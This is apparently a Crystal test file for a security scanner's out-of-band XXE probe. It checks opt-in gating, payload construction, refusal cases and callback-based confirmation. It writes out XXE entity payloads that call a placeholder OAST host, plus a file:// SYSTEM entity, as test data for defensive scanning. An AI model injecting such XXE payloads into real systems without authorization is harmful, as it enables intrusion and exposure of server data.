require "../../spec_helper"
require "../../support/probe_harness"

private class XmlMinter < Gori::Probe::OutOfBand::Minter
  getter minted = 0

  def initialize(@payload = "xml123.oast.example")
  end

  def mint : {String, String, Int64}?
    @minted += 1
    {@payload, "xml123", 7_i64}
  end
end

private class XmlBackend < Gori::Fuzz::Backend
  getter origin : Gori::Fuzz::Origin = Gori::Fuzz::Origin.new("https", "acme.test", 443)
  getter sent = [] of Bytes

  def initialize(@fail = false)
  end

  def send(bytes : Bytes) : Gori::Repeater::Result
    @sent << bytes.dup
    Gori::Repeater::Result.new("HTTP/1.1 400 Bad Request\r\n\r\n".to_slice, "XML parse error".to_slice,
      nil, 1_i64, error: @fail ? "connection failed" : nil)
  end
end

private def xml_flow(store, body = "<root><value>keep</value></root>", method = "POST",
                     content_type = "application/xml", target = "/xml", extra = "")
  probe_capture_flow(store, "HTTP/1.1 200 OK\r\n\r\n", method: method, target: target,
    req_headers: "Content-Type: #{content_type}\r\n#{extra}", req_body: body)
end

describe Gori::Probe::Active::XxeOast do
  rule = Gori::Probe::Active::XxeOast.new

  it "requires an OAST listener and explicit unsafe opt-in, even on GET" do
    with_store do |store|
      minter = XmlMinter.new
      ["GET", "POST", "PUT"].each do |method|
        detail = xml_flow(store, method: method)
        [Gori::Probe::Active::Options::DEFAULT,
         Gori::Probe::Active::Options.new(oob: minter),
         Gori::Probe::Active::Options.new(allow_unsafe: true)].each do |opts|
          rule.plan(detail, opts).should be_nil
          rule.dedup_key(detail, opts).should be_nil
        end
      end
      minter.minted.should eq(0)
    end
  end

  it "preserves a SOAP document and prolog while adding exactly one parameter entity" do
    with_store do |store|
      prefix = "\uFEFF<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!-- 한글 --><?app value?>\n"
      document = %(<soap:Envelope xmlns:soap="urn:soap"><soap:Body>$TOKEN &amp; keep</soap:Body></soap:Envelope>)
      detail = xml_flow(store, prefix + document, content_type: "application/soap+xml; charset=\"utf-8\"",
        target: "https://acme.test/xml?keep=%FF", extra: "Authorization: Bearer $TOKEN\r\nContent-Length: 2\r\n")
      minter = XmlMinter.new
      opts = Gori::Probe::Active::Options.new(allow_unsafe: true, oob: minter)
      rule.dedup_key(detail, opts).should_not be_nil
      minter.minted.should eq(0)
      plan = rule.plan(detail, opts).not_nil!
      plan.dedup_key.should eq(rule.dedup_key(detail, opts))
      minter.minted.should eq(1)
      plan.followups.should be_empty
      plan.pipeline.should be_empty
      plan.oob.size.should eq(1)
      rule.requests_per_flow.should eq(1..1)
      head, body, _ = Gori::Miner::Inject.split(plan.request)
      String.new(body).should eq(prefix + "<!DOCTYPE soap:Envelope [<!ENTITY % gori_xxe SYSTEM \"http://xml123.oast.example\">%gori_xxe;]>" + document)
      String.new(head).should start_with("POST /xml?keep=%FF HTTP/1.1")
      String.new(head).should contain("Authorization: Bearer $TOKEN")
      String.new(head).should contain("Content-Length: #{body.size}")
      plan.params.first.location.should eq("xml")
      plan.oob.first.code.should eq("xxe_oast")
      plan.oob.first.severity.should eq(Gori::Store::Severity::High)
    end
  end

  it "keeps path and query callback tokens literal inside the system identifier" do
    with_store do |store|
      payload = "https://oast.example/callback/xml123?token=xml123&source=probe"
      plan = rule.plan(xml_flow(store), Gori::Probe::Active::Options.new(allow_unsafe: true,
        oob: XmlMinter.new(payload))).not_nil!
      wire = String.new(plan.request)
      wire.should contain("SYSTEM \"#{payload}\"")
      wire.should_not contain("&amp;")
      head, body, _ = Gori::Miner::Inject.split(plan.request)
      String.new(head).should contain("Content-Length: #{body.size}")
    end
  end

  it "uses the other delimiter for a quoted provider URL and refuses unrepresentable payloads" do
    with_store do |store|
      detail = xml_flow(store)
      quoted = "https://oast.example/xml123?value=\"test\""
      plan = rule.plan(detail, Gori::Probe::Active::Options.new(allow_unsafe: true,
        oob: XmlMinter.new(quoted))).not_nil!
      String.new(plan.request).should contain("SYSTEM '#{quoted}'")
      ["file:///tmp/example", "https://oast.example/xml123#fragment", "https://oast.example/a\nb",
       "https://oast.example/\"'"].each do |payload|
        rule.plan(detail, Gori::Probe::Active::Options.new(allow_unsafe: true,
          oob: XmlMinter.new(payload))).should be_nil
      end
    end
  end

  it "declines existing DTDs, unknown prologs, unsupported encodings and large bodies" do
    with_store do |store|
      minter = XmlMinter.new
      opts = Gori::Probe::Active::Options.new(allow_unsafe: true, oob: minter)
      ["", "not XML", "<!-- unterminated <root/>", "<!DOCTYPE root><root/>",
       "<!DOCTYPE root [<!ENTITY x SYSTEM 'file:///tmp/example'>]><root>&x;</root>",
       "<?xml version=\"1.0\" encoding=\"UTF-16\"?><root/>", "<root>\0</root>",
       "<root>\xff</root>", "<root>" + "x" * Gori::Probe::Active::BODY_CAP + "</root>"].each do |body|
        detail = xml_flow(store, body)
        rule.plan(detail, opts).should be_nil
        rule.dedup_key(detail, opts).should be_nil
      end
      minter.minted.should eq(0)
    end
  end

  it "declines HEAD, ambiguous headers, non-XML, compressed, chunked and partial bodies" do
    with_store do |store|
      opts = Gori::Probe::Active::Options.new(allow_unsafe: true, oob: XmlMinter.new)
      rule.plan(xml_flow(store, method: "HEAD"), opts).should be_nil
      ["text/html", "application/notxml", "application/xml; charset=utf-16"].each do |ct|
        rule.plan(xml_flow(store, content_type: ct), opts).should be_nil
      end
      ["Content-Encoding: gzip\r\n", "Transfer-Encoding: chunked\r\n",
       "Content-Encoding: gzip\r\nContent-Encoding: identity\r\n",
       "Content-Type: text/plain\r\n", "Content-Encoding : gzip\r\n"].each do |extra|
        detail = xml_flow(store, extra: extra)
        rule.plan(detail, opts).should be_nil
        rule.dedup_key(detail, opts).should be_nil
      end
      detail = xml_flow(store)
      partial = Gori::Store::FlowDetail.new(detail.row, detail.http_version, detail.request_head,
        detail.request_body, detail.response_head, detail.response_body, request_body_truncated: true)
      rule.plan(partial, opts).should be_nil
      rule.dedup_key(partial, opts).should be_nil
    end
  end

  it "deduplicates endpoint query values and document contents" do
    with_store do |store|
      opts = Gori::Probe::Active::Options.new(allow_unsafe: true, oob: XmlMinter.new)
      first = xml_flow(store, target: "/xml?id=1")
      second = xml_flow(store, "<other/>", target: "/xml?id=2")
      rule.dedup_key(first, opts).should eq(rule.dedup_key(second, opts))
      rule.dedup_key(first, opts).should_not eq(rule.dedup_key(xml_flow(store, target: "/other"), opts))
    end
  end

  it "sends once, records the candidate, and only promotes it after a matching callback" do
    with_store do |store|
      detail = xml_flow(store)
      backend = XmlBackend.new
      disabled = Gori::Probe::Active::RULES.map(&.info.id).reject { |id| id == "xxe_oast" }.to_set
      disabled.delete("request_smuggling") # default-off membership means ENABLED
      dets = Gori::Probe::Active.analyze(detail, outbound: ungated_outbound, overrides: nil,
        backend: backend, disabled: disabled,
        opts: Gori::Probe::Active::Options.new(allow_unsafe: true, oob: XmlMinter.new),
        on_oob: ->(rid : String, candidate : Gori::Probe::OutOfBand::Candidate) {
          Gori::Probe::OutOfBand.record(store, rid, candidate, detail.row, detail.row.id)
        })
      backend.sent.size.should eq(1)
      dets.should be_empty # even a parser error is not proof of external resolution
      Gori::Probe::OutOfBand.sweep(store, 0_i64)[0].should be_empty
      store.insert_oast_callback(7_i64, "callback-xml123", "http", "GET", "192.0.2.1",
        "xml123.oast.example", "".to_slice, nil, 2_000_i64)
      findings = Gori::Probe::OutOfBand.sweep(store, 0_i64)[0]
      findings.size.should eq(1)
      findings.first.code.should eq("xxe_oast")
      findings.first.flow_id.should eq(detail.row.id)
      findings.first.evidence.not_nil!.should contain("HTTP callback")
    end
  end

  it "does not record an outstanding probe after a failed send" do
    with_store do |store|
      backend = XmlBackend.new(fail: true)
      recorded = [] of String
      disabled = Gori::Probe::Active::RULES.map(&.info.id).reject { |id| id == "xxe_oast" }.to_set
      disabled.delete("request_smuggling")
      Gori::Probe::Active.analyze(xml_flow(store), outbound: ungated_outbound, overrides: nil,
        backend: backend, disabled: disabled,
        opts: Gori::Probe::Active::Options.new(allow_unsafe: true, oob: XmlMinter.new),
        on_oob: ->(rid : String, _candidate : Gori::Probe::OutOfBand::Candidate) { recorded << rid; nil })
      backend.sent.size.should eq(1)
      recorded.should be_empty
    end
  end
end
